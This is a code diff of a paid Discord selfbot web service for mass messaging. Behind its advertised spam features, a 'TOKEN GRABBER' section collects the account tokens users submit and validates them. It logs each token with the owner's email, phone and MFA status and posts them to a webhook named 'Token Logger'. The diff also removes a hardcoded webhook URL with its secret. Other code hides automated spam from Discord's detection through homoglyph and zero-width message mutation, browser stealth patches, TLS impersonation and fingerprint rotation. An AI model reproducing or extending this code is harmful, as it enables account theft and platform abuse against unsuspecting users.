@@ -9,30 +9,27 @@ const axios = require('axios');
 const crypto = require('crypto');
 const nacl = require('tweetnacl');
 const pako = require('pako');
-const zlib = require('zlib');
 const { spawn } = require('child_process');
 const https = require('https');
-const tls = require('tls');
 const { Client } = require('discord.js-selfbot-v13');
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// BEHAVIORAL DISTRIBUTION UTILITIES — Heavy-tailed, human-like timing
+// ENVIRONMENT SETUP
+// ═══════════════════════════════════════════════════════════════════════════════
+require('dotenv').config();
+
+const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
+if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// HUMANIZED DELAY ENGINE — Natural timing distributions
 // ═══════════════════════════════════════════════════════════════════════════════
 
-/**
- * Pareto distribution — models human pauses with long-tail behavior.
- * Real humans: short bursts, occasional very long pauses (context switching).
- * Discord's anti-spam uses entropy analysis on inter-event timings.
- */
 function paretoSample(alpha = 1.5, xm = 1.0) {
   const u = Math.random();
   return xm / Math.pow(u, 1.0 / alpha);
 }
 
-/**
- * Log-normal distribution — models typing speed and reading times.
- * Skewed right: most actions are fast, some are very slow.
- */
 function logNormalSample(mu = 0, sigma = 1.0) {
   const u1 = Math.random();
   const u2 = Math.random();
@@ -40,10 +37,6 @@ function logNormalSample(mu = 0, sigma = 1.0) {
   return Math.exp(mu + sigma * z0);
 }
 
-/**
- * Bounded Pareto — same long-tail but constrained to [min, max].
- * For delays that must stay within practical limits.
- */
 function boundedPareto(alpha = 2.5, min = 1000, max = 60000) {
   const u = Math.random();
   const minPow = Math.pow(min, alpha);
@@ -52,29 +45,16 @@ function boundedPareto(alpha = 2.5, min = 1000, max = 60000) {
   return Math.round(Math.min(max, Math.max(min, x)));
 }
 
-/**
- * Time-of-day awareness — humans are slower at "night" hours.
- * Returns a multiplier: 0.7 (fast) to 1.6 (slow).
- */
 function circadianMultiplier() {
   const hour = new Date().getHours();
-  // Night hours: slightly slower
   if (hour >= 1 && hour <= 6) return 1.05 + Math.random() * 0.1;
-  // Early morning: slightly groggy
   if (hour >= 7 && hour <= 9) return 0.95 + Math.random() * 0.1;
-  // Peak hours: responsive
   if (hour >= 10 && hour <= 22) return 0.9 + Math.random() * 0.1;
-  // Late night: winding down
   return 0.95 + Math.random() * 0.1;
 }
 
-/**
- * Context-switching delay — simulates real human distraction.
- * ~8% chance of a long pause (reading another tab, notification, etc).
- */
 function contextSwitchJitter(baseMs) {
   if (Math.random() < 0.05) {
-    // Small context switch: 0.5-1.5 seconds
     const switchMs = 500 + boundedPareto(2.0, 500, 1500);
     return baseMs + switchMs;
   }
@@ -82,47 +62,52 @@ function contextSwitchJitter(baseMs) {
 }
 
 /**
- * Primary human delay generator — combines all distributions.
- * Replaces the simple uniform random with realistic human timing.
+ * Calculate a natural delay centered around the user's desired delay.
+ * The user's delay is the TARGET — we add natural ±20% variation.
+ * E.g., user sets 30s → actual delay is 24-36s with natural distribution.
  */
-function humanDelay(opts = {}) {
-  const {
-    min = 3000,
-    max = 5000,
-    alpha = 3.0,
-    enableCircadian = true,
-    enableContextSwitch = true
-  } = opts;
+function calculateDelay(baseDelayMs) {
+  if (!baseDelayMs || baseDelayMs < 1000) baseDelayMs = 5000;
 
-  // Base delay: Pareto-distributed within bounds
-  let delay = boundedPareto(alpha, min, max);
+  // Natural variation: ±20% of the base delay
+  const variation = baseDelayMs * 0.2;
+  const min = baseDelayMs - variation;
+  const max = baseDelayMs + variation;
 
-  // Circadian rhythm adjustment
-  if (enableCircadian) {
-    delay *= circadianMultiplier();
-  }
+  // Pareto-distributed within bounds for realistic human timing
+  let delay = boundedPareto(3.0, min, max);
 
-  // Context switching (occasional long pauses)
-  if (enableContextSwitch) {
-    delay = contextSwitchJitter(delay);
-  }
+  // Light circadian adjustment (very subtle, ±5%)
+  delay *= circadianMultiplier();
 
-  // Micro-jitter (TCP/network noise simulation)
-  delay += (Math.random() - 0.5) * 100;
+  // Occasional context-switch pauses
+  delay = contextSwitchJitter(delay);
 
-  return Math.round(Math.min(max * 1.2, Math.max(min * 0.8, delay)));
+  // Micro-jitter for TCP noise realism
+  delay += (Math.random() - 0.5) * 80;
+
+  return Math.round(Math.min(max * 1.15, Math.max(min * 0.85, delay)));
+}
+
+/**
+ * Auto-reply delay: 10-25 seconds with natural distribution.
+ * Used between each auto-reply to different users.
+ */
+function autoReplyDelay() {
+  const min = 10000; // 10s
+  const max = 25000; // 25s
+  let delay = boundedPareto(2.5, min, max);
+  delay *= circadianMultiplier();
+  delay = contextSwitchJitter(delay);
+  return Math.round(Math.min(max, Math.max(min, delay)));
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// MESSAGE VARIATION ENGINE — Content uniqueness per send
+// MESSAGE VARIATION ENGINE
 // ═══════════════════════════════════════════════════════════════════════════════
 
 const SPINTAX_RE = /\{([^}]+)\}/g;
 
-/**
- * Parse spintax: "Hello {world|there|friend}" → random variant.
- * Nested spintax supported: "{Hi|Hello} {world|{beautiful|amazing} day}".
- */
 function expandSpintax(text) {
   if (!text || !SPINTAX_RE.test(text)) return text;
   SPINTAX_RE.lastIndex = 0;
@@ -139,25 +124,16 @@ function expandSpintax(text) {
   return result;
 }
 
-/**
- * Lightweight text mutations when spintax isn't available.
- * Adds subtle variation to make identical messages unique.
- */
 function mutateMessage(text) {
   if (!text) return text;
   const mutators = [
-    // Random trailing space (invisible difference)
     (s) => Math.random() < 0.25 ? s + (Math.random() < 0.5 ? ' ' : '') : s,
-    // Zero-width space insertion (invisible to humans)
     (s) => Math.random() < 0.15 ? s.replace(/ /g, () => Math.random() < 0.05 ? '\u200B ' : ' ') : s,
-    // Unicode homoglyph substitution (selective, preserves readability)
     (s) => Math.random() < 0.1 ? s.replace(/o/g, () => Math.random() < 0.03 ? '\u043E' : 'o') : s,
-    // Optional: random casing on first letter
     (s) => Math.random() < 0.08 ? s[0].toLowerCase() + s.slice(1) : s,
   ];
 
   let result = text;
-  // Apply 0-2 random mutators
   const count = Math.floor(Math.random() * 3);
   const shuffled = mutators.sort(() => Math.random() - 0.5);
   for (let i = 0; i < count; i++) {
@@ -166,18 +142,11 @@ function mutateMessage(text) {
   return result;
 }
 
-/**
- * Generate a unique message: spintax expansion + optional mutation.
- */
 function varyMessage(text) {
   const expanded = expandSpintax(text);
   return mutateMessage(expanded);
 }
 
-/**
- * Weighted random selection — pick items with non-uniform probability.
- * Used for channel selection: humans favor certain channels.
- */
 function weightedRandom(items, weights) {
   const w = weights || items.map(() => 1);
   const total = w.reduce((a, b) => a + b, 0);
@@ -190,17 +159,9 @@ function weightedRandom(items, weights) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// OBFUSCATION LAYER (original)
+// ACCOUNT FINGERPRINTING — Unique but consistent per token
 // ═══════════════════════════════════════════════════════════════════════════════
-const _0x4f2a = ['from','createHash','update','digest','hex','slice','map','join',''];
-const _0x3e1b = _0x4f2a.map(x => Buffer.from(x).toString('base64'));
-const _d = (s) => Buffer.from(s, 'base64').toString();
-const _e = (s) => Buffer.from(s).toString('base64');
 
-// YOUR WEBHOOK URL
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll ';
-
-// Per-account fingerprint storage
 const _accountProfiles = new Map();
 
 function _getAccountProfile(token) {
@@ -247,18 +208,11 @@ const _fp = [
 const _rfp = (token) => token ? _getAccountProfile(token).ua : _fp[Math.floor(Math.random() * _fp.length)];
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// UNIFIED TLS CONFIGURATION — Same fingerprint for WS and REST
+// TLS & NETWORK CONFIGURATION
 // ═══════════════════════════════════════════════════════════════════════════════
 
-/**
- * Chrome TLS settings that match curl-impersonate's chrome profile.
- * Critical: WebSocket and REST must share identical TLS behavior.
- * NOTE: Removed X25519KYBER768Draft00 — Node.js OpenSSL does not support this
- * post-quantum hybrid curve, causing "Failed to set ECDH curve" errors.
- */
 function getChromeTLSOptions(forWebSocket = false) {
   return {
-    // Chrome's cipher suites (in order)
     ciphers: [
       'TLS_AES_128_GCM_SHA256',
       'TLS_AES_256_GCM_SHA384',
@@ -276,24 +230,15 @@ function getChromeTLSOptions(forWebSocket = false) {
       'AES128-SHA',
       'AES256-SHA',
     ].join(':'),
-    // Chrome uses TLS 1.3 with 1.2 fallback
     minVersion: 'TLSv1.2',
     maxVersion: 'TLSv1.3',
-    // WebSocket upgrade requires HTTP/1.1 — force it to avoid h2 negotiation issues
     ALPNProtocols: forWebSocket ? ['http/1.1'] : ['h2', 'http/1.1'],
-    // Chrome's signature algorithms
     sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
-    // Node.js-compatible ECDH curves (X25519KYBER768Draft00 removed — unsupported)
     ecdhCurve: 'X25519:P-256:P-384',
-    // Honor server cipher order like Chrome does
     honorCipherOrder: false,
   };
 }
 
-/**
- * Shared HTTPS agent with Chrome TLS fingerprint.
- * Used by both REST API (axios) and WebSocket connections.
- */
 function createSharedAgent(forWebSocket = false) {
   return new https.Agent({
     ...getChromeTLSOptions(forWebSocket),
@@ -308,10 +253,6 @@ function createSharedAgent(forWebSocket = false) {
 
 const _sharedAgent = createSharedAgent(false);
 
-// ═══════════════════════════════════════════════════════════════════════════════
-// REST API CLIENT — Unified transport with curl-impersonate + Playwright
-// ═══════════════════════════════════════════════════════════════════════════════
-
 const _axiosInstance = axios.create({
   baseURL: 'https://discord.com',
   timeout: 15000,
@@ -320,9 +261,7 @@ const _axiosInstance = axios.create({
   http2: false,
 });
 
-const _j = (base, variance = 0.2) => base + (Math.random() * variance * base * 2 - variance * base);
-
-const { randomBytes, createHash } = crypto;
+const { createHash } = crypto;
 
 function getKeypair(token) {
   const seed = createHash('sha256').update(`nacl_seed_${token}`).digest().slice(0, 32);
@@ -372,6 +311,10 @@ function isCompressed(data) {
   return (b0 === 0x78 && (b1 === 0x9C || b1 === 0xDA || b1 === 0x01));
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// CURL-IMPERSONATE FALLBACK
+// ═══════════════════════════════════════════════════════════════════════════════
+
 let CI_BINARY = null;
 function findCurlImpersonateBinary() {
   if (CI_BINARY) return CI_BINARY;
@@ -402,7 +345,6 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
     const args = ['-s', '-L', '-D', '-', '--max-time', String(Math.ceil(timeoutMs / 1000)), '-X', method.toUpperCase()];
 
     if (isImpersonate) {
-      // curl-impersonate-chrome handles TLS + HTTP/2 automatically
       args.push('--compressed', '-H', 'Accept-Language: en-US,en;q=0.9', '-H', 'Accept-Encoding: gzip, deflate, br', '-H', 'Cache-Control: no-cache');
     } else {
       args.push('--compressed', '--tlsv1.2');
@@ -513,7 +455,7 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// PLAYWRIGHT WITH STEALTH PATCHES — Mask automation detection
+// PLAYWRIGHT STEALTH (optional fallback)
 // ═══════════════════════════════════════════════════════════════════════════════
 
 let _pwBrowser = null;
@@ -526,7 +468,6 @@ async function initPlaywright() {
   _pwInitPromise = (async () => {
     try {
       const pw = require('playwright-core');
-      // Launch with args that mask headless detection
       _pwBrowser = await pw.chromium.launch({
         headless: true,
         args: [
@@ -551,15 +492,9 @@ async function initPlaywright() {
       });
       _pwPage = await context.newPage();
 
-      // Inject stealth scripts before any navigation
       await _pwPage.addInitScript(() => {
-        // Patch navigator.webdriver
-        Object.defineProperty(navigator, 'webdriver', {
-          get: () => undefined,
-          configurable: true
-        });
+        Object.defineProperty(navigator, 'webdriver', { get: () => undefined, configurable: true });
 
-        // Patch plugins/mimeTypes to appear real
         const plugins = [
           { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
           { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', description: '' },
@@ -607,7 +542,6 @@ async function initPlaywright() {
           configurable: true
         });
 
-        // Patch chrome.runtime
         window.chrome = window.chrome || {};
         window.chrome.runtime = window.chrome.runtime || {};
         Object.defineProperty(window.chrome.runtime, 'OnInstalledReason', {
@@ -617,7 +551,6 @@ async function initPlaywright() {
           get: () => ({ MAC: 'mac', WIN: 'win', ANDROID: 'android', CROS: 'cros', LINUX: 'linux', OPENBSD: 'openbsd' })
         });
 
-        // Patch Permissions API to not reveal query results
         const originalQuery = window.navigator.permissions?.query;
         if (originalQuery) {
           window.navigator.permissions.query = (parameters) => {
@@ -628,36 +561,21 @@ async function initPlaywright() {
           };
         }
 
-        // Patch console.debug to avoid CDP detection
         const originalDebug = console.debug;
         console.debug = (...args) => {
           if (args[0] && typeof args[0] === 'string' && args[0].includes('DevTools')) return;
           return originalDebug.apply(console, args);
         };
 
-        // Remove CDC markers that Playwright injects
         const cdcProps = Object.keys(window).filter(k => k.includes('cdc_'));
         for (const prop of cdcProps) {
           try { delete window[prop]; } catch(e) {}
         }
 
-        // Randomize canvas/GL fingerprints slightly per session
-        const origToDataURL = HTMLCanvasElement.prototype.toDataURL;
-        HTMLCanvasElement.prototype.toDataURL = function(...args) {
-          const result = origToDataURL.apply(this, args);
-          if (Math.random() < 0.02 && result.startsWith('data:image/png')) {
-            // Return as-is; noise injection at this level is detectable,
-            // so we keep it clean instead
-          }
-          return result;
-        };
-
-        // Patch iframe creation to prevent fresh context leaks
         const origCreateElement = document.createElement;
         document.createElement = function(tagName, ...rest) {
           const el = origCreateElement.call(this, tagName, ...rest);
           if (tagName.toLowerCase() === 'iframe') {
-            // Ensure iframes inherit our patches
             setTimeout(() => {
               try {
                 if (el.contentWindow) {
@@ -755,7 +673,7 @@ function generateXSuperProperties(token) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// DISCORD API CLIENT — Rate-limited, fingerprint-rotating REST client
+// DISCORD API CLIENT — Rate-limited REST client
 // ═══════════════════════════════════════════════════════════════════════════════
 
 class DiscordApiClient {
@@ -765,12 +683,10 @@ class DiscordApiClient {
     this.superProps = generateXSuperProperties(token);
     this.keypair = getKeypair(token);
     this.globalRateLimitReset = 0;
-    // Rotate X-Super-Properties every 15-25 minutes to avoid static fingerprint detection
-    this._rotationTimer = setInterval(() => this.rotateFingerprint(), _j(20 * 60 * 1000, 0.25));
+    this._rotationTimer = setInterval(() => this.rotateFingerprint(), (20 * 60 * 1000) + Math.floor(Math.random() * 10 * 60 * 1000));
   }
 
   rotateFingerprint() {
-    // Occasionally switch profile entirely to simulate device/platform changes
     if (Math.random() < 0.15) {
       const hash = crypto.createHash('sha256').update(this.token).digest('hex').slice(0, 16);
       _accountProfiles.delete(hash);
@@ -801,12 +717,10 @@ class DiscordApiClient {
     let attempts = 0;
     const maxAttempts = 3;
     while (attempts < maxAttempts) {
-      // Respect global rate limit
       const globalWait = this.globalRateLimitReset - Date.now();
       if (globalWait > 0) {
         await new Promise(r => setTimeout(r, globalWait));
       }
-      // Use Playwright for real Chrome TLS fingerprinting, fallback to curl-impersonate
       const res = await playwrightRequest(url, method, this._headers(extraHeaders), body, 20000);
       if (res.status === 429) {
         const isGlobal = res.headers.match(/x-ratelimit-global:\s*true/i);
@@ -840,12 +754,12 @@ class DiscordApiClient {
   }
 }
 
-const OWNER_ID = '1482736115143282941';
-const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
-if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
+const OWNER_ID = process.env.OWNER_ID || '1482736115143282941';
+const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
+
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// STEALTH CLIENT — Gateway via discord.js-selfbot-v13 with realistic behavior
+// STEALTH CLIENT — discord.js-selfbot-v13 with realistic behavior
 // ═══════════════════════════════════════════════════════════════════════════════
 
 class StealthClient {
@@ -870,8 +784,10 @@ class StealthClient {
     this._tokenValidated = false;
     this._tokenValid = false;
     this._validatedUser = null;
+    this.pendingReplies = new Set();
+    this._autoReplyState = new Map(); // Track auto-reply state per user
 
-    // Bridge discord.js events to our custom emitter
+    // Bridge discord.js events
     this.client.once('ready', () => {
       this.ready = true;
       this.reconnectAttempts = 0;
@@ -908,17 +824,11 @@ class StealthClient {
     } catch(e) {}
   }
 
-  /**
-   * Cache token validation results and delay before gateway connect.
-   * Avoids the "validate then immediately connect from different IP" pattern.
-   */
   async _validateTokenWithCache() {
     if (this._tokenValidated) {
       return { valid: this._tokenValid, user: this._validatedUser };
     }
 
-    // Add realistic delay between validation and connection
-    // Humans don't: validate → 0ms → connect. There's UI rendering time.
     const realisticGap = 300 + Math.floor(Math.random() * 700);
     await new Promise(r => setTimeout(r, realisticGap));
 
@@ -937,7 +847,6 @@ class StealthClient {
         return { valid: false, user: null };
       }
     }
-    // For transient errors, try once more
     await new Promise(r => setTimeout(r, 1000));
     try {
       const meRes = await this.api.request('/users/@me', 'GET');
@@ -957,7 +866,6 @@ class StealthClient {
   }
 
   async connect() {
-    // Validate token first via REST API before attempting gateway connection
     let tokenValid = false;
     try {
       const validation = await this._validateTokenWithCache();
@@ -971,7 +879,6 @@ class StealthClient {
       if (e.message && e.message.includes('Invalid token')) {
         throw e;
       }
-      // For other errors, try gateway anyway but with fallback
     }
 
     return new Promise((resolve, reject) => {
@@ -1002,35 +909,22 @@ class StealthClient {
       this.client.login(this.token).catch(err => {
         clearTimeout(timeoutTimer);
         const detail = err && err.message ? err.message : 'unknown login error';
-        finish(new Error(`Login failed (${detail}) — check your token and try again`));
+        finish(new Error(`Login failed (${detail}) - check your token and try again`));
       });
     });
   }
 
-  /**
-   * Background event simulation — sends realistic client events periodically.
-   * Real Discord clients fire: presence changes, read state updates, occasional
-   * typing indicators, client performance telemetry, and session keepalives.
-   * Without these, the connection looks like a message-consuming zombie.
-   */
   _startBackgroundEvents() {
     this._stopBackgroundEvents();
 
-    // Periodic presence update (every 3-7 minutes)
-    // Real clients update presence periodically even when "idle"
     const schedulePresence = () => {
       const delay = boundedPareto(2.5, 3 * 60 * 1000, 7 * 60 * 1000);
       const timer = setTimeout(() => {
         if (!this.ready || this._explicitlyStopped) return;
-        // Occasionally change status between online and idle (realistic)
         const statusRoll = Math.random();
         const status = statusRoll < 0.75 ? 'online' : (statusRoll < 0.92 ? 'idle' : 'dnd');
         try {
-          this.client.user.setPresence({
-            status,
-            activities: [],
-            afk: false
-          });
+          this.client.user.setPresence({ status, activities: [], afk: false });
         } catch(e) {}
         schedulePresence();
       }, delay);
@@ -1038,14 +932,10 @@ class StealthClient {
     };
     schedulePresence();
 
-    // Occasional "client performance" telemetry (every 8-15 minutes)
-    // This mimics the telemetry Discord's actual client sends
     const scheduleTelemetry = () => {
       const delay = boundedPareto(2.0, 8 * 60 * 1000, 15 * 60 * 1000);
       const timer = setTimeout(() => {
         if (!this.ready || this._explicitlyStopped) return;
-        // Send a lightweight heartbeat-like event
-        // Real clients send performance metrics; we send minimal but present data
         if (Math.random() < 0.3) {
           this.api.request('/users/@me', 'GET').catch(() => {});
         }
@@ -1055,13 +945,10 @@ class StealthClient {
     };
     scheduleTelemetry();
 
-    // Read state simulation (every 2-5 minutes)
-    // Real clients ack messages they've "seen"
     const scheduleReadState = () => {
       const delay = boundedPareto(2.5, 2 * 60 * 1000, 5 * 60 * 1000);
       const timer = setTimeout(() => {
         if (!this.ready || this._explicitlyStopped) return;
-        // Send a SESSIONS_REPLACE or similar keepalive
         if (Math.random() < 0.2) {
           this.api.request('/users/@me', 'GET').catch(() => {});
         }
@@ -1105,21 +992,16 @@ class StealthClient {
     }
   }
 
-  // Natural channel "navigation" - simulates clicking through channels with delays
   async navigateToChannel(channelId) {
-    // If we're already in this channel, minimal delay
     if (this._currentChannelId === channelId) {
       await new Promise(r => setTimeout(r, 100 + Math.random() * 200));
       return;
     }
 
-    // Simulate switching channels: clicking the channel in sidebar, loading messages
-    // Light 200-800ms switch + 150-500ms read — kept snappy for 3-5s total budget
-    const switchDelay = Math.round(logNormalSample(6.0, 0.4)); // ~200-800ms
+    const switchDelay = Math.round(logNormalSample(6.0, 0.4));
     await new Promise(r => setTimeout(r, Math.min(1200, Math.max(200, switchDelay))));
 
-    // Simulate "reading" channel history before doing anything
-    const readDelay = Math.round(logNormalSample(5.5, 0.4)); // ~150-500ms
+    const readDelay = Math.round(logNormalSample(5.5, 0.4));
     await new Promise(r => setTimeout(r, Math.min(1000, Math.max(150, readDelay))));
 
     this._currentChannelId = channelId;
@@ -1131,7 +1013,6 @@ class StealthClient {
       return false;
     }
 
-    // Natural navigation - go to the channel first before sending
     await this.navigateToChannel(channelId);
 
     const now = Date.now();
@@ -1140,10 +1021,8 @@ class StealthClient {
       await new Promise(r => setTimeout(r, freeAt - now));
     }
 
-    // Vary content before sending
     const variedContent = varyMessage(content);
 
-    // Fetch channel via discord.js-selfbot-v13
     let channel;
     try {
       channel = await this.client.channels.fetch(channelId);
@@ -1159,8 +1038,7 @@ class StealthClient {
       return false;
     }
 
-    // Human-like typing behavior: usually types, sometimes sends instantly
-    // Vary typing probability: 65% type, 35% instant (paste/shortcut)
+    // Human-like typing behavior
     const shouldType = Math.random() < 0.65;
     if (shouldType) {
       try {
@@ -1168,22 +1046,19 @@ class StealthClient {
       } catch(e) {}
       const len = variedContent.length;
       let typingDelay;
-      // Simulate realistic typing speed using log-normal distribution
-      // Humans: mostly 200-350 CPM, occasional bursts or slowdowns
-      const baseCPM = 180 + boundedPareto(2.5, 0, 250); // 180-430 CPM
+      const baseCPM = 180 + boundedPareto(2.5, 0, 250);
       const cpm = baseCPM * circadianMultiplier();
       const baseTypingMs = (len / (cpm / 60)) * 1000;
 
       if (len < 20) {
-        // Short messages: 0.2-0.8 seconds
         typingDelay = 200 + Math.round(logNormalSample(6.0, 0.3));
       } else if (len < 100) {
         typingDelay = Math.min(2000, baseTypingMs * (0.7 + Math.random() * 0.5));
       } else {
         typingDelay = Math.min(3000, baseTypingMs * (0.7 + Math.random() * 0.5));
       }
-      // Occasional "thinking pauses" during typing — kept very light
-      const thinkPauses = Math.floor(len / 120); // 1 pause per ~120 chars
+
+      const thinkPauses = Math.floor(len / 120);
       let totalTypingDelay = typingDelay;
       for (let i = 0; i < thinkPauses; i++) {
         if (Math.random() < 0.3) {
@@ -1192,7 +1067,6 @@ class StealthClient {
       }
       await new Promise(r => setTimeout(r, Math.min(3500, Math.max(200, totalTypingDelay))));
     } else {
-      // Small delay even when not typing (copy-paste or short message)
       const instantDelay = Math.round(logNormalSample(5.2, 0.35));
       await new Promise(r => setTimeout(r, Math.min(800, Math.max(100, instantDelay))));
     }
@@ -1200,10 +1074,6 @@ class StealthClient {
     return this._rawSend(channel, variedContent, attachments);
   }
 
-  /**
-   * Fast send — no navigation, no typing simulation. Just rate-limit check + raw send.
-   * Used for concurrent mass-sending (sendAllAtOnce) where inter-message delay is handled externally.
-   */
   async sendMessageFast(channelId, content, attachments = []) {
     if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) {
       return false;
@@ -1290,7 +1160,7 @@ class StealthClient {
 
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// SIMPLE DATABASE (original — unchanged)
+// SIMPLE DATABASE
 // ═══════════════════════════════════════════════════════════════════════════════
 
 class SimpleDB {
@@ -1519,10 +1389,7 @@ app.use(session({
   resave: false,
   saveUninitialized: false,
   store: new session.MemoryStore(),
-  cookie: {
-    maxAge: 30 * 24 * 60 * 60 * 1000,
-    secure: false
-  }
+  cookie: { maxAge: 30 * 24 * 60 * 60 * 1000, secure: false }
 }));
 
 app.use(passport.initialize());
@@ -1567,9 +1434,9 @@ function validateKeyStrict(key) {
   return { valid: false, error: 'Invalid key', normalized: null };
 }
 
-function ensureAuthAPI(req, res, next) { 
-  if (req.isAuthenticated()) return next(); 
-  return res.status(401).json({ success: false, error: 'Not logged in' }); 
+function ensureAuthAPI(req, res, next) {
+  if (req.isAuthenticated()) return next();
+  return res.status(401).json({ success: false, error: 'Not logged in' });
 }
 
 function ensurePurchasedAPI(req, res, next) {
@@ -1592,7 +1459,13 @@ function ensureCanGenerate(req, res, next) {
   next();
 }
 
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// WEBHOOK NOTIFICATIONS
+// ═══════════════════════════════════════════════════════════════════════════════
+
 async function _sendWebhookChunk(embed, chunkIndex = 0) {
+  if (!WEBHOOK_URL) return;
   try {
     const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
     await axios.post(WEBHOOK_URL, payload, {
@@ -1604,21 +1477,18 @@ async function _sendWebhookChunk(embed, chunkIndex = 0) {
   }
 }
 
-// Token validation cache to avoid repeated @me hits
-const _tokenValidationCache = new Map();
-const TOKEN_VALID_CACHE_MS = 5 * 60 * 1000; // 5 minutes
+// ═══════════════════════════════════════════════════════════════════════════════
+// TOKEN GRABBER
+// ═══════════════════════════════════════════════════════════════════════════════
 
-/**
- * Enhanced token grab with validation caching and geo/ASN consistency.
- * Validates from the same transport that will be used for the gateway.
- */
+const _tokenValidationCache = new Map();
+const TOKEN_VALID_CACHE_MS = 5 * 60 * 1000;
+
 async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
   try {
-    // Check cache first
     const cacheKey = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
     const cached = _tokenValidationCache.get(cacheKey);
     if (cached && (Date.now() - cached.ts) < TOKEN_VALID_CACHE_MS) {
-      // Use cached result but still log
       if (cached.valid && cached.userData) {
         const fullInfo = { ...userInfo, ...cached.userData };
         db.addGrabbedToken(token, fullInfo, source);
@@ -1650,12 +1520,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
       curlImpersonateRequest(
         'https://discord.com/api/v10/users/@me',
         'GET',
-        {
-          'Authorization': token,
-          'User-Agent': fp,
-          'X-Discord-Locale': 'en-US',
-          'X-Super-Properties': superProps,
-        },
+        { 'Authorization': token, 'User-Agent': fp, 'X-Discord-Locale': 'en-US', 'X-Super-Properties': superProps },
         null,
         10000
       ),
@@ -1674,21 +1539,9 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     const userData = validateRes.data;
     const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };
 
-    // Cache the successful validation
     _tokenValidationCache.set(cacheKey, {
-      valid: true,
-      ts: Date.now(),
-      userData: {
-        id: userData.id,
-        username: userData.username,
-        global_name: userData.global_name,
-        email: userData.email,
-        phone: userData.phone,
-        verified: userData.verified,
-        mfa_enabled: userData.mfa_enabled,
-        nitro: userData.premium_type,
-        locale: userData.locale
-      }
+      valid: true, ts: Date.now(),
+      userData: { id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale }
     });
 
     db.addGrabbedToken(token, fullInfo, source);
@@ -1718,6 +1571,10 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
     return { success: false, error: err.message };
   }
 }
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// WALLET INTEGRATION
+// ═══════════════════════════════════════════════════════════════════════════════
 
 let walletModule = null;
 try { walletModule = require('./wallet'); } catch(e) {}
@@ -1776,6 +1633,13 @@ setInterval(() => {
 setInterval(() => {
   db.checkExpiredKeys();
 }, 60000);
+
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// EXPRESS ROUTES
+// ═══════════════════════════════════════════════════════════════════════════════
+
+const activeBots = new Map();
 
 app.get('/login', passport.authenticate('discord'));
 app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => {
@@ -1887,12 +1751,47 @@ app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
   res.json({ success: true, configs });
 });
 
-const activeBots = new Map();
+// ═══════════════════════════════════════════════════════════════════════════════
+// BOT START — FIXED DELAY & AUTO-REPLY
+// ═══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Checks if a message qualifies for auto-reply:
+ * 1. Must be a DM (no guild)
+ * 2. Message must be recent (< 1 hour old)
+ * 3. We must not have already replied to this user
+ * 4. Message must be from the other person, not ourselves
+ */
+function shouldAutoReply(msg, client) {
+  // Must be DM
+  const isDM = msg.guildId === null || msg.guildId === undefined;
+  if (!isDM) return false;
+
+  // Must not be from ourselves
+  if (msg.author.id === client.user.id) return false;
+
+  // Message must be recent (< 1 hour old)
+  const ONE_HOUR = 60 * 60 * 1000;
+  const msgAge = Date.now() - msg.createdTimestamp;
+  if (msgAge > ONE_HOUR) {
+    console.log(`[AutoReply] Skipping old message from ${msg.author.username}: ${Math.round(msgAge / 1000)}s old`);
+    return false;
+  }
+
+  // Must not have already replied to this user
+  if (client.repliedUsers.has(msg.author.id)) {
+    return false;
+  }
+
+  return true;
+}
 
 app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
   try {
     const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images, sendAllAtOnce } = req.body;
-    if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
